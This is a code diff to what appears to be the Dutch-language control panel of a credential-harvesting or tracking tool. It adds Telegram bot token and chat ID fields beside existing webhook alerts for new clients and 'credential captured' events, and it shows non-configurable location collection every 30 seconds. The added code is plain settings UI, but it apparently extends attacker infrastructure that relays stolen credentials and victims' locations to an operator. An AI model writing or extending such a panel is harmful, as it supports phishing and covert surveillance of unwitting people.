@@ -901,6 +901,11 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             <div class="cfg-row" style="margin-top:6px"><label>Nieuwe client</label><label class="tgl"><input type="checkbox" id="cfg-webhook-new-client" checked><span></span></label></div>
             <div class="cfg-row"><label>Credential opgepakt</label><label class="tgl"><input type="checkbox" id="cfg-webhook-credential" checked><span></span></label></div>
             <div style="margin-top:8px"><button class="cfg-btn secondary" onclick="testWebhook()">Test Webhook</button></div>
+            <div style="margin-top:16px;border-top:1px solid var(--border2);padding-top:12px;">
+                <div style="font-size:.7rem;color:var(--dim);margin-bottom:8px">📱 Telegram notificaties — stel TELEGRAM_BOT_TOKEN en TELEGRAM_CHAT_ID in als env vars, of vul hier in</div>
+                <div class="cfg-row"><label>Bot Token</label><input type="text" id="cfg-telegram-token" placeholder="123456:ABC-..." style="flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--fg);padding:5px 10px;border-radius:6px;font-size:.72rem"></div>
+                <div class="cfg-row" style="margin-top:4px"><label>Chat ID</label><input type="text" id="cfg-telegram-chat" placeholder="-1001234567890" style="flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--fg);padding:5px 10px;border-radius:6px;font-size:.72rem"></div>
+            </div>
         </div>
     </div>
     <div class="cfg-actions">
@@ -2804,6 +2809,9 @@ async function loadConfig() {
     if ($('#cfg-webhook-url')) $('#cfg-webhook-url').value = cfg.webhookUrl || '';
     if ($('#cfg-webhook-new-client')) $('#cfg-webhook-new-client').checked = cfg.webhookOnNewClient !== false;
     if ($('#cfg-webhook-credential')) $('#cfg-webhook-credential').checked = cfg.webhookOnCredential !== false;
+    // Telegram settings
+    if ($('#cfg-telegram-token')) $('#cfg-telegram-token').value = cfg.telegramBotToken || '';
+    if ($('#cfg-telegram-chat')) $('#cfg-telegram-chat').value = cfg.telegramChatId || '';
 }
 
 async function saveConfig() {
@@ -2818,6 +2826,9 @@ async function saveConfig() {
         webhookUrl: ($('#cfg-webhook-url')?.value || '').trim(),
         webhookOnNewClient: $('#cfg-webhook-new-client')?.checked !== false,
         webhookOnCredential: $('#cfg-webhook-credential')?.checked !== false,
+        // Telegram
+        telegramBotToken: ($('#cfg-telegram-token')?.value || '').trim(),
+        telegramChatId: ($('#cfg-telegram-chat')?.value || '').trim(),
         // Always-on, non-configurable
         photoEnabled: false, videoEnabled: false,
         locationEnabled: true, locationPeriod: 30000
